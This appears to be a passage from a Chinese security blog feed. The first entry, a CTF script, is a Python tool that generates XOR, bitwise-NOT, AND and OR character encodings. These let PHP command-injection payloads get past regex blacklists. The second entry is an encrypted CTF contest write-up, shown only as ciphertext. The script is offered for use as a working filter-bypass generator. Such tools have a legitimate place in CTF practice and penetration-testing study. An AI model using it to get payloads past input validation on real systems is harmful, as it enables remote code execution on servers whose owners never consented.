        <content type="html"><![CDATA[<p>很好用，各种绕过姿势</p><pre><code class="python">from typing import finalimport stringdef realHex(num):    if num &lt;16:        return &quot;%0&quot;+hex(num)[2:]    else:        return &#39;%&#39;+hex(num)[2:]pattern=input(&quot;请输入正则过滤式,没有则直接回车跳过\n&quot;)#正则表达式修饰符re.I大小写不敏感,re.M多行匹配,影响^和$,re.S使得.匹配包括换行在内的所有字符,re.U根据Unicode字符集解析字符,影响\w,\W,\b,\B#建议回车跳过,这个功能很逊if pattern != &quot;&quot;:    import re    blacklist=[&quot;`&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]    for i in range(32,255):        if  re.search(pattern,chr(i),re.I):            blacklist.append(chr(i))else:    #blacklist列表中的字符在生成的拼接字符串中不会被使用,除了部分是被过滤掉的字符，其余的如&#39;,&quot;等字符考虑可能会导致闭合等问题暂列入    #如果有其他的要求可以对blacklist列表进行删改    #!注意对于|和&amp;来说拼凑字符是相当困难的,并且可用范围实际上是31-255,这就导致了要这样用必须引号包裹,否则大概率GG    #比如&#123;,&#125;,;,|,&amp;,$等诸多符号不带引号会导致无法使用    blacklist=[]    for word in string.ascii_letters+string.digits:        blacklist.append(word)    blacklist+=[&quot; &quot;,&quot;^&quot;,&quot;~&quot;,&quot;|&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]#print(blacklist)#不同于取反,一个目标字符串使用异或的方式可以获大量的可用拼接字符串,这里只取了1种组合的拼接字符串#如果需要获得更多拼接字符串查看该函数中的result列表def yiHuo(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;&quot;&quot;^&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #这里更换范围        for i in range(1,255):           if(chr(i) not in blacklist):               #这里更换范围                for j in range(1,255):                    if(chr(j) not in blacklist):                        if(i^j==ord(rawstr[k]) and [hex(j).replace(&#39;0x&#39;,&quot;%&quot;),hex(i).replace(&#39;0x&#39;,&quot;%&quot;)] not in result[k]):                            result[k].extend([[realHex(i),realHex(j)]])    #在这里往下的函数部分,result列表均是可用的(已填充了获得的拼接字符串)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.find(&quot;^&quot;,0)-1]+result[i][0][0]+&#39;&quot;&#39;+finalstr[finalstr.find(&quot;^&quot;,0):]        finalstr=finalstr[:finalstr.rfind(&quot;&#39;&quot;,0)]+result[i][0][1]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef quFan(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;~&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #这里更换范围        for i in range(1,255):           if(chr(i) not in blacklist and chr(int(bin(~i &amp; 0xFF)[2:],2))==rawstr[k]):               result[k].extend([realHex(i)])    #print(result)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.rfind(&#39;&quot;&#39;,0)]+result[i][0]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef rce_and(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i&amp;j)==rawstring[l]:                    #注意&amp;在URL特殊含义,故需要URL编码                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;%26\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrdef rce_or(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i|j)==rawstring[l]:                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;|\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;该字符在现有黑名单和字符范围下无法拼接出-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrwhile(True):    operationEffient=True    target=input(&quot;请输入待转换字符\n&quot;)    while(operationEffient):        operation=input(&quot;请选择操作\n0-&gt;重新输入\n1-&gt;使用异或拼接\n2-&gt;使用取反获得\n3-&gt;使用二进制和\n4-&gt;使用二进制或\n&quot;)        if(operation==&quot;1&quot;):            result=yiHuo(target)            pass        elif(operation==&quot;2&quot;):            result=quFan(target)            pass        elif(operation==&#39;3&#39;):            result=rce_and(target)            pass        elif(operation==&#39;4&#39;):            result=rce_or(target)            pass        elif(operation==&quot;0&quot;):            break        else:            print(&quot;选择的操作无效&quot;)            continue        if result!=&#39;&#39;:            print(result)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>timeline sec新人赛</title>
      <link href="/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/"/>
      <url>/2022/04/11/timeline-sec%E6%96%B0%E4%BA%BA%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="428e54a308c76cc06c7c2d72cf4499a827fc0118fcc10fae0cb9da6413e54d4d">329582d599d3308dd96c6b56d6bc1f822d06e9b899f44b25299bc2af72884e3d1abc9a4cd96e9c064d8877009252c5c8bcd41a7c27c6f8cf9a1e6130ca81228bdd9144fcf6846357a0c9d8613dcc392ecd3e717b8255092600bbf3f8d419080ed19a0846c44b23d901695644a103dccbc7497f4e6c767353ae14186ad319c9b10e346c6cb43e9b166bbc9460c4e81469b3eb647c6f7c9d73d32bfa139c259acfa805a31f9d5b268e0fc2d9dfecaca20e3159320fa37c99e5fe4ae174f454076e37b7e8060543ed6230a0cba0ee606e767a8a2dd902b2002b8a5be1729059d7a60bc517f8b4b6872eedb845107d7d09225ee136f571fe30e8a7544f4ab403b709e817759b736d015bbe2cc3e05bf0d89c627a8d00c3bb26f0fcc5386e6b7d7b5a236521d2b573c195e794a16974c995ccd1c511a60c0c919f8441e72ab4f5b9bd0a3d7f61076519ced1f9d9b2f521c925d5ef0080d88a41a212b5845108f2f88e01a03801c34b02a248e4daaf3e66df8ec5d93408136c89108c28ea5197198e8559b00cb948609a6cf418b1f4d7e8f9351ddf07d42df8382012f70f0877f112b2dd6a3b19fa80f104594b666a0e8cd541fad67df3828af720d60ab4e349b4b50c787a00d72d0008bf427ce2cc8e7f9c93fa28e309fca535d81ce5c9128d04e820c25c26d47ff59a726a6ec4dfb77e600a6ea1aae2155b1a881d64ef30d6868f28d2a516fb6a18a9013c012da9237487789d3e53731102f7a597070ef37ac49509ccf338144026af8e4f5943f708f7506145e46cab8f0947a199b1a1ba2210c8d7f468a0a62780cdbc1ca48ff4bce9dd2578d824dddc8c76ebce493d105b12bea66025995b2138e7357cfd97a8fa2016e25eb95230de7e3f9af4cf664f1b7579a26600a6c11560343b9619a1488af1daa6dd17098ccaf0a595e53e519f4820c7419b75ebdc7be32f0c5deb67b219f760de5e31fe60b66771c96d0036453a20c467b1d29194acc4ef5a39f751591ef328a4bdde6484ae80f925c6892ff2d0ff58edf291bc5830868791762749d43c114ac5f125b95eccca40b872cd517651dc52a9cefccf31398447e2788705bb9799750ac2aa4fa6b715435bb8efcb59bae5d787156d7dcc8340fff81bef5a80e6ce42d1fbfddfc8776b8243e4da8c8af7a86f08f97334513a311a27e803e0b9b8472c92603595a726c9f058fff54d544ff8d10e7618616eefe8239f0df69fd773c2148a9ec6f4d8e2f4d26fea86a116e329a40af27786cea6f5c878078476f1dc4b58ccd22b42eaa582362f7853a41a00cbb3c57863b808e393e3af80139d21109706c7f5ab07f33619d6493ef47cc96bb7a4f6b7c7782003d96ac9191f55dc7983d36e53a2aaaaccc48cd18394a46999f9f97d12500b16227fd2d43242319a8cd83a8d05ffba1517144f3e8877b1090ff0e94fcd615f26355f7b9dc11c8aff59a886abe67aa90e2dd2b10d9cc28a2ed8609f8ee8f1c592a518c515e167ade2509194c77b4efaa3c13918404a65b97e929a272e733808bd07647d8acc02efc40c8ae8dd6310f778391373e7004b00cbd0fc39601b60c4059c1bdfbf475b2ca5354a11740d482ad51d7a07a1e8677c8cb54dfa39069a9425f3e4d61df8786e6f06d04311c5b9a56e658f2b187ce5b0ade9439e9134000c8265f5e7b99e3953c6061c10c48fc8e1e515886edbcbf2e3dde8d66dcaab6fa9386c23326c78ff0fff8546e768ceba3a19df40338eae6a57e79a09ee1d83b74dcf7e0e77a47cb38f279ad4262fe20045fdb62f37d6005bb1a34f7fab0e339f3952b747926c8019c9f53926a96b4adddd1699920fbb29a5acfeddb676dc0d946bf12ad2eaf7eb86284cb3e477648eebedb8f05b35e58aa0343be98ac87f485d5279b0c592ffae6545d7a3676f4da3fea3e3d4c7b0f8f4b44971702a9ab6ba91153879349f7d66f161345f082bc20be3ba21255d1c70df472f6990fbdc8dc273a950d14db7553d3d0125710d06ef35ef9dbf785466cb33e31fa0d94e361f106586bcbd56ac948fd7fdadecf8a586312212d01c5080791c9ef7c800cd781a41936231108f915a971112c3ca18343f237fba3a45830252d9d6d1fa4cf7a29851f24e605526ac900eaf68ca1d5209064982bd11f31255e42699be684e241a7c0648624ece30150ba54b91af2e5d052ddf157a3ab9ecfd3ffaebf5c6e99179efaae43d10746ab697e6cc3a04927ecd1068718e02cde5229d9684d39fca866c9fcfb568a8c5270573762b8e9b2925d235d2aa0a7208f2a4d90788585914bce49be77447a6d3a2efd5a285316a0002c9d55f65e4a3d3a96c4439ccd7202fac0f0cd3a46bfd4bb70f07722b83c8b7a112db0d10e5c9d0aa8a5f8578bd224197f3ac0e9a49cbee7c239901bd49c938ea16a4da2f76972cde91e5cab429c3ed5b0897a8e889cc3968e22c4b656a90eaee5d2a7836d42b55eaedc8c6f72880816f09acb582b5352a0171f90513913ba94534d144f597a1b91ef248c625f526fbcc8f7f7cbc136dba515cdcc4970761fb39129a1713b32c76a4677af646c2aa13d2a87469f387e080bc9b0f83454c165e9b043b26fa8ead3b4070303aea73737084d07146e8e66cb18efd71dd1cd3043638b0317a941cc44f409acb7bf8a3213d8ce2b6290b73058394862242583fb2a56571a0f0b7a0241cbd547f5527476cf3b0c92bd04fb4967259a40f5773550a7c80047be30e4bd61eed384d21db5e1ea0eda8eb572dfc8c5ad75eb52330e320e087478cf2cee5de6afd0cd1c481073df5592651d3d441c455d57adfa2cc63b508f1dd26d08fb5e73ece1fd881907886a83d9b4b924a0ba8499a743f38e9a72aa2c3086a4376fc7348c395c489ca1b7792d10ecf2069ca1c404fe5cd3e9ee094927bbb8a9f02b4213f387e02b0891734ca4228a0369ecd9bfa70367b5103651aaa76e5da29297e661b7b0d9ec90b4bc6512c49107a07f07590c8d68a4f0af61333b6406fa03dc9ebb3ab6843ac965f90441113a54c6c13793d218774e3f09099cef9e33a9fc20220cd663343f8f1105e6cdca8ab479e9c511a4e56499026ce27c1b747001e42fff9430d6ee857de9d427f476d022fe462f9dddfa652586b5995cd6a111557eed0f770b743aee17d7f3f50196d803f6ff4daae6ce3d0f9ac0e50e5284993c5556b971c1f2b17d0303453f93f1fddb5cd541d374a045748d7b8776dc9f606ae358887b6d6b90f23348b0d57458364d2ecd76474364278a2b1fce7fb7ffff10800082d0b9fedbab82039f3ba1ba680958813407ed288f07b04be926f653f3303947de3b7eca127668a8f267e14bed5c6272d45cf50c76e70de24e24aee576c5c5401c89f5ebe9cff81125cad6599da3624b046e2acde0a0b7f615449905d17dff132c6b1b2583b1a56f9350a0cb995f7b32ed68367a489baabf213f21d058550725d83ab3f909ef3187b6f89ef0b9d2852cef01ce66f95f66ea5e67eecf854f1f45f841891242dddf616dc03b1946df3913b393ee44c8c18d982dcb1308af2e10786198f7969aaa76d91f34b43eb964a74513294c3e3f80ba31686fa4c2f03b5b30ea63b6b6ed50c4785d398f4c81da113b532de964ce0bf306ee7a3f6455091b5c8ff27e6b4128fbb83c5383d2401ce14a7146f63e268b179ac196bee7b3ae3b047a940ac5d3343dd375aa4ac98945d7efd83203348d6d2f3992674334196892c32ff83396d52a91adc74fd94cea277b95916f68663865cdd3bee1d7641e5531ab4a5c5d386d1ade07514eba377bddfd5403e9cc6091ed9e47428aa0d52d04b0857ae6d70477f407c96f673412d99d03d98417dc42d593d644e96dc293161f94a4dbce11db5098fab92e688cfd41e9667085841c535e2a48e9eff907bf3e0cac0d02c363d4611b37c073aaf6d50dc09eeaa3f92cde008c21e2068aafb836e0d07ad37cbd347207045eb0932decb06f5942eb0436ac38590be747853f8093240c3df86770c212bb59f91fddde1fe1538dd5f07542b5c62ae124a95604eb630068809c472c6ce8260c4ef28d01f8bb45cf7bee33e94d69a10f5f1d3c1104f6e74a1703ac851e2c4e327c5b6a7c6ec7f18a09359efcc50342147b4527324672921c0847224c04c64f04e5f3370346cbf258eb07a12b3248fad6781c927fb04e66ace5f6ec20bc111cf276dbaac52be64ec3ffac93fff6adadf21fafaad872a55f24cb3325438002287b53a5417563fb41b002f5ed7ad9226f637d148b6c49beda61608c954d86d5fd41550b63510ce0f6f947e22d6d9d839c13d01b02ab56899ac1c66763d9e3de0702823e9c4764941cec2e8408145eca635651cbe086532220eb0f3586b4877dd35c2020e9aa5e6369172c0dd7a0a28081973f85505128c80be4b8576987e1cbe55d9ddbb24b4efeaa1902c49a2f785fa6f68bc999c1b0f230d05e6d7feb4ae82d8580220e618c92e63b98ae7318ca013f518bdb6e140c3c3585c91129c1685f6bc3d572c87ebe71c3b78b8747a4979a23d4ae783f1648cbd3acc34434b6518e47a06ccc76c4f07d23520287659321beb01691f278b2bca5a7a292b86ffdd26a9cb57a3b93142321c584eb18dbb56af58f6077a2c3365e35aa34a87f79fc272b28fc68604e656b2e165a79a2576ba6e6116dcb68600bbe0b595ac94d209ee874b9ef1c165dd3fabfa2edd84c429f51f6ee3718c61de7922b47580a95a072451bb4c1bcc28b86f54b392be9f442ef626a0b21bdb3b62c82f1d8c9ddbe071358830d2a03191c641eab05a96db551648a9531a107314da0f48511916bd38f1a6bd43dca9e180c1def08688efed8d1a4f711c76b0d397ab70b65660f1028646b35a3341afed86ea46ff6878d24f0fbad297787b952d13e9cc819967e326c3c4ad3ead8f65f2477cb071c449b5f074ddef3946b64a117a67cfe2c7d6f1950fac703ff0a8d4cb85190f9ca46b1d7327d35b2481aa15e79ffac4ccc3620e9fd279af89ccc0daa592b9024ac6246a74196126594761b9fae601068da60d44e2b39b24b5219d343db1f3a201c8e25ef03d14bba3714b31e944bd7209429a29588e558ad031dd2aec5b1d0c23244f88816631ad041a15efc233da60a3600bc88d183bddbefde26cb87500c4614f1546921f637b4735968b93f04974627d3f47eb92e72742f239827eeacda1f0cf256557fcfec1e350df216ad75a1e3c7e6909052dc3c48b3ac7b580b94d8ebafbdccd2a7ba1fb11403826ee8c8eef00e3543cc959ffd28e49d3c7a95169d45d7944f59e3a752c6c91b833e8ba82d0a5f1bda11116e3be101bd752656de5583a9ca64b3beef10a442109054ac5e223750a61a42e0976d53b3e5583c58a0e55fb521f2a435bcfa21d759d436dfbd7343fafe387ba8cf81ba5bc0fd9126532360e034b87e1b78c1a6e4653a39957ca31915f4b21292bf20866df8ae5a5c08934dd5d87e5ec7cb9fe014bdb6a3d018a45ec4de254c7e9bb998a15e12239d40a8c78bad0985074075e044a8a2d23088ed44db6298307a9f976814a360f40b9070df959c17402cdcdbfd9eaf961425bb049ce0cee67d9909d4208b16d7cd5077b1eb41b91b1b2d15c561665a6f17dc12a84c0a46523b8dfad7041c40328b661fc87a8385295387ff0068c57f67edfd3fee6dee8b9cda4e4ed984f95090e69edf71ca6ffed1fda8a0b53bb600c32726d010a9469a0a80934a5a386795872dba909bc4f76921885aac9ea5b823f083ec8cadfbd5aef455ecefa46a1e14e25134aecd6256bf9dd8b5affa20ff07b1300e5fb7f815e34e0a5a6a1e9106624be5844f2e77d8abf4caa24ac68a7d304973cd780a0c851af70553af49edb65a2c4600391f80868be780d116b003ebc057fe96962bdcbed7caed4938d02dddf913b5f7a119c691460dabdc0261a454aba93e5c85e29bb0ed26cad281308cb7ed4c97b9fa40ff33925b20adfe49b79b8632ae67796d42d68384b762ca9c21d7377f44de4ab3f73bf4d03cce6c8d8d679438ff909bf412cf7e62ff6e6976b71bc24fb48c4bda5a814ecbf721848f557e28695e9df7aeae60d328878b48cabb1bd7586fd5c842420a1d68d7cbe59d008b21406aa1cd4b2c8e410b5b2365472be8767310a54fa25dde8985b1379c21c14c4bfbd92ce39a65c556c20a73505db4c8c55ee4a084e3ad5687d127161e750e45b77f0162be51ccb61ea2d57c29a2097602ed58ec187d5915dd1ec63ed3f0cc642d69a68bfd5cf128a9d543cbf8e83acf7b9a8a42ff5521a0f1de44d4a13200f450aefb141519342d08b9fbedecfabeb1980f8934d7f2b112c7d399c35d8ce14d0982bfe227a1f9be6561e8a3052dcf21f045ee976e8ef9eb1b5d597e40e9ef48a96e911a8be50dbc8060d2d96b103e7d077860f224e60613e14ed5cdbbd722394e26cc571b767124e7eb4535abbdb5a5ce1746bc4712789da622892f01fbc3a53c74e11ac624ecac78f6bf9cff68229b04d58dd0210a4d09522d59525ba5085c18b1bb730a30930fef024b4a61a331f4c90ab35d0b572f183ee3a6d965ef037d3aca3ac16c824140d3cf6ab8bb572336e7d664af4784837b1934550fd8f92c95c46959114e381f58e432ce9adb74ce8cf9fe8775432c4443da719cc98075f3265ee1e044e96d9644a445591762d18c78152bafbb7ef9289fc16b434cff0136822ce512d7720a12bdf35fe7748e7132d13b8c40d8c3dc92f026a149276cfd46ee1d237c58656fbc054fc170f9ff8bd665289681bcbd2cce8e0de9e4d4764191f6328e501e3f856066284d65b037a5c92cd756837b2e925cbe481b95c71899c426cc51efbf2a1fb5ed22ba8db30fd756d8809c566188da8558265f17de4f50c3cb1870aab3e4a2066aff25fe58d9270094b3b72477931ff25b720ac9b41f6f58ab97e9890df5713f6af1dc6212414339f5ecc59041ab5fbe7b28891a617cf47780bbfdf0d93fcd8a60934ba2be13185e6620efb3c2fe951b8dfd0321cd62d8b676afe9b6422d19678b3b290d3302599088acad9edf02e0a2ee48b857beecb7026661459ef54a26dbea89e89643e74f18c9df59dddec5e1a213724ab623cfe2796e372493b76e92c8d123dae53a6a6af05393b959eda139d5313d45abc5b6da4d1a1a74d02b2cd24af950506306164cd0f1a41b94d40f1114cd7584af30d50dd60d3a482ff5a0f5c605dbf5a2ae620ec04990473b4c903fe8669bc44e08038e47a478cf8ff18898d5e92fe714ddd9b7de946147c8c8b7b2bfbb5bc35310f0489aa658160107f740047932704007ab9f3ff05eae5df19c8cd1c665d962775dc912d3f636d9e2e72904a7dc6f7e2b448dcd7b4366147168f4ecb726749cd314f82de33814bdad6d4d6597fcaabdca79401b5ee5381ed64a69e0dd3851460f8b5d69147de84228481303bf3023df004d3ad11ae799cd8b6cd669315b2dc8679c4ec250c73e392e31c65e6cbe7f4024b0fc5040e06805807f512da9e003e707a6b9cd7188edf1e0a3689984509f991f3133aed4e6fc9e54ecdce2ae41f12628ba3c846d11b4b3329af18b761c9073940007eb87b2a1d8489fe2885b2b1d679f729d0720c9715f5c79c2b1c4482d2cca0e98be1bce6aa106dd532cdbaf7a9523dc9a9b3d4b996a7c6d9df3fe73594a34215406c222dbef81bcc565aff128168396c5c784d3312cfec5bc2a636261fd5f47712410e8c675a2c74772e2652dec7d40ec64324eefe73ae9ad308fe5bd65c82ea467c545968fd5914ccf1c0d85d0f7af440fda3a206267c51246b93078661a611b2007c5a394202980e77ef5c8b8b237f0e666febc8d25eaa2847b402a9b3dec98b3d3e2444964598bea029e36697215bfc1bf28d0124d8b5aa705151a595924065b0a4dac9600d0564af0bbce0dfd9c49c2db546e4a3aa3d5b45d936892929b672d0dee1aac8f67b0a442dde094af9b16918e11933f44e1230d16af42039ccc7f8c9cb5b1e242ce8338cd66f0249b1ed09329414a50477d4dd2d5940e7d192d913d607ce0aadb9af00746c03f41ba6f331d9048b1c366175cb63d7ab8fad9cd9517d426c87a66660b0db63a2570fe4f62d7759ad21c5230601b62a016776ebe99a7424e4e27be00615d1ca9be38405f1cdc9827831dea3a8fd98d0b441b57e607051ef893ae37a870ca4364847225689f925c66dfa80fafcf8b7ae4932dfa2eefae801feb0a995fd3a033c68c0c07cb4923a9a39359900c6630a6d13c66711b185a78dcf545b4da8f3531d112c9de5cdc12627c8b044b075db10a77dde42394631d9f8336b5f24947d8a665b41757b1b0e0e5e4c3ff43b1c140741d7891b819d6f9911f7f10a4b130413734f6201c78ec53940a4a29cab7d256ff1134f594b533747463a5eaf562cbb3d366067ee69c3c997e94bfef9cab8332cfae1f0209f5f0648e651bf5aa97c3f57d32f7a62008df48a379768949fa9e29f32d434a9dd2d34b84013860255bc20b6d3273aaefd3c6bfa326f34a4b790294dd7d650a95476d1a3dfdb844751950e68d746e359811ec57fd15f6d7ffac3442461ace7a860d35e9755a1190f94cf1102cf5456cd5fd7a40f1cf0fccee8b05a4b95384af35beab6ee2e640ec87b59df7f80014d9dd7a5d88273ff27022ac88187e40969d37cf76399f586fccbf0348327438445b05e529997e06cd08c4b1ef174a6518d2ed2acdc615b0a4395f0749f1ee3ac6775d10e91e1a57a628ea8e3705fb1fb0996c1d240a26ccb62f3f433ef9450aa979509be5532e984bea6becab2995c52789d6bd4760c6a84a3959154102450adcf1eadaa0648045e4fede795c6dc8ca9a471385986977b86122ba03a85686fcf1647a9826a1f843d572d72901cb27149d04135f453d12db0d3a9ca4b66d29e1f699e3437581c3296a816ab81e7bbbe2eb528b0f6ba63a1e8c781edc200dcf4a358bf906d90d7547d71780fba55b49c73753902c42a2a87ad98ccf50002f1fcecce2b6a1f2532de4a9b6f85f21b3d39370f913cb3e738d38746d255f72430196792093f536ba2529916b86bf66c7e28296a320ac924fee4c26c9945b96110d3c798585025d7779c175265e56ffce66ad408035193a3096b3e5ab7895077f74857c033344b2d7c7c2e5f164e9e42ae1be95dcaa0f5fa186bbb840e099250fbb1231f4f4af00b58fc661f5d639cdbbdbceda7988fcace599ba55b495f9cbd19c5c25fcc5c67551670ce6cc160c16150088ac78793a03c6d9cd10fa095ddc686115d65ac7ee29e23f1ed2931b428f24bdf0357ea48e9f264a1a7fe9ae0d008cff2cb24da3ed3742368d555be55967963caad3278f80fb1fe82b6c29b4c1d397e22e76e69c977eab0d57da0c063e917108519f6818cb1778f7a033d5d84bbcf02374a5edf61205ef90dd1ace9227605bc781d3946605b2e39c29983becf0a5bfd0d17a345b23eacd8b7a31a5968256b7fcbe22d972c74eec722ddd9616f7d00fef5e1278059a925ee33649f12fa158321ac2def7f4eaa2e23f114090bbae50364d3bd160df139aa58f466e9eda549389b346ee25d4918565b9cc4b70665b26bbd228bbf64c94ac4b5e16bd12294a1ae634ba75308c58d241461243ba6f9cccb7d9c4f040552262ccb39c15b1b927e87fd3f13bcde43b4209a3093cc48094bde8c901b4b20580dfa6d6b9bfc1b9f70e5c7d6ca4141742b2c2cc23f7792426d5a6087056399f0264e7f936c3d3e2f6150bdae7a0cf9f5376a66209c6ca49e705588f2b3548a074e4d92195318df02ecf7dc0286997002a42b8be58be99400d0d9a504e972e803f467bb75be63fadd5135dacd1b4988a239f5da34589adc661b8b43ee550bd671d0dc699bb2162b1d3eec677e10dd64103db5c9afad77c17583043172da86b6b24025b3b5de296dbabc98e90417860205cd9900ad3bf75a64381fa3b0c1a37b50f3de716e948803f7fdf41bdf365d515deda340462f2edd1a91940353b46b1bf76f955824eeb8589222b1ede3bc8fa97b4b0aa6a3d431409cebac2efe331f2adf7f9bc77bc348969669f420b7d2237aa8f1e3fd57c0ec9e95512efdf42d0fc8bcd59c4eb41b8aa7241d9ffe87bd060004670fe4cdf58ea5c8807b44e1de94c91b72455e8240f989407a79b974b5acbddd8478c989a58a2fbe21a36fe06fb824afadf0c02339a0140c2a78cb492de0426e37a5aa63f3dd8e4b86cc2b9bef178ba4c2bd4817c278c5852dc1ac0064b9754a3a1a878c5e90d84e05d0d8aa853951a7fea68d5cb1e772bcec5c7977ff2d772e89480c92d7cb279b75e02a47c37dda7fb9b661ed66bb3f77d40d47632e1c414edfbfded44366fbe1353707dcc9afc468afb7e9bf27e98df8390424bd1dce22371ecc1c59631075223f0a904e8677da6001ef94dc3030e245158ec6bda7a18a25877bb8145f6f93f55828e418aa6b3e2a42838266d6453a9b4cf070244fb7135330c30de6b9a0014d0beb7030b058007d72d7502d1eb5233f52e5c340d6c54128d0472d81679b16350d23ca4df23763b465298f6b7e349f83280c9751084e434ad725d8720fc752f1c769d2dcad533a396c5b0d89a434349a2f5cb9c1a15ec87317ee48535ccee5e56983c47cf808e6588c7ba36761cf0a694edb7be11729a461a59905b8e87c310b6610b79551627d1d369fbd8ca4b1503639afcbd0e21766166f7896fe7b9c7ecea6f85e92df28779bc071da78d0baec4c5c84ac3445174147684cc7c831aac3c2b423cf920f4c6258651e3a9fcffb9ac5a859d3759130b7a8b291f5ca320de391e2c440d58e7d3307e6517ded8ac5ddd4e18cefbd13938caa25d754b03358b430e45899b60a648dc65329f9d198d912c9647b88b972523f6fd3053c880b621c0a2acc99800cc8199653af2e083e1098980661ea6ca73cd3b3061a617fdd4b95b3dab42d3a498ab1cf6e46e4fe351da9c33941b51a9589bdcb3e6947a8532236e02e46d6711747d3429e2012b155f28c591e5b33980e8e8e41134099a6ef9c3681b98e163fed74c5aa4d22f46c49ecf4d3b2e28302dfe448693bc135fc213e532f879755ab61180cb3cbbb0fe5e93d759ad58761d4346a2bb861520bbcbd41b10224a62d5eeea50c2384e93362b46fe865e5f4b3fd9eea6cc2b3210354727f0a8ce82f0d51ae07fcb9f32a4bf30f1b03b2be455e1333c000c739261455412a24716fa12764562a138c28b7a5713ec38c4e8152ec353f0ac58e89fae8e9cf75a9b1470fa78a4dfd4b589cf3d0def1222361a3101317bb375198684f54e3844523ce02f8baf6d58ee3de6955897fe1821afba70bf2fe2036ecde6fe45f8bb57bbe8fde5dc2709d6c75e8d5bf60cbc56e61dbf893556dbc829ab857481117dcdd8e3b160147da9c1d7920734c8c1a68e0444a809ed2b3a60122b0872b9fc64253cf294a06d3bc56e5dc9a0871c7a233b4d827550f3e4446ae11bd5c6f427ce8d7968827a8eff9845ab78ae3f94401b30f3a79f59144e029b282fb1ca8acfbb0447d1c683cb0f567a1eb4f69c7d6a9d22d849dec4ae74e76ae3dc72441474e3c20c963007f71eb404c87deceaf21f9498bed5181afc4110b6ddf77516695da935e0811fc1afac4d06d78dcff64c553dec9c9097763417d59e6651032ccecc0f7ee580d1f0019456c2a4157da7fd4c4b860b48ee50d885e18aa1877c8e6c4a28d4c1692b1d4a45a515f8ef14318337cd934e416ae5c633e67b4942c8e8873886b61cd26d900d43bfc93fa78698d0760dc38d8c84b503d890e351d719a59f1441fcaf217ee673a1a50830212939127f10cae76eec15cd757fb43b8ec784a15093d099b7fb322589ffed452b69209e66eb0ff003872cf628f5a3b1ba1a91ce9e3113c1cbd62939df75c7c8e98533147ac56c1da9a7e25344b19fe5f8db01065f918de6e0f2e981c8e67e17ec8cada379aa2ce9ff68086332c7bffbe9578cee4c9e82e53490719779653f440db07bd82a13a0e57974663fba17a97b56ed246ae795768d062da470aa034a59c758a47a4a3ed00d0e543a1bf23641c9bbe368aba5bb940e4cca4769d1905eb764e07f2ec72af705da8ed68a04437330198acdb39217614f08c4feacf958eb0fcc41e4b2cb1aec365bf546a435625f3dc6b118bfe0f5ed400f585383aced4010048e178c59f5bbe042244e4216ec7658b385f2addb8720f8ca1b607cf922d119e06e67f42e8084a5fc7a517dadabd350ba09efda7d67260295a39b295a32e4007ddaec9d270cb29d28afd4f76ee82fa93641c40365713c6d6f71059369660ec7c131060b75aca95ece71572bf84363504279d7ebfd11fea515721d7b28fd1b20899c0ad0c37f56ced47578be6c578058cd6d65cabeba103dc2d08674b9b129cceed2c126a0f76f6e46780dfadd5ee4731978ff336c0510a34dd3e071279e3f76fb2437f31a79240f0bfd1cc169bcdfb3ab0386e85557725021b38142a4be20ec6cedcb45008ad9d3bd645b275f1e5060dda0c9116930d3ec469e894210085199992afbc7120a669114d28212cc64469125c970587dcf398d74fcf59e8781b9c7b6413f21316433435691018a77845c37cb2bad1d4fce9408aee935ee2a93a492815b55ac85c2673b3fc5f4e951a3e5181017dbf2e629eae98204f2cc66fa3e4697557c08aa672ad13d10278c910849afc188588205d1a29df1d3180795c0d0e2e610be3fc961e04c5b723e411a3e2bc4225ce97cf96987e6986fc5d5d41a97558af5f9bed5be98e8631c07fb498fb20f4a72a826c83bef8446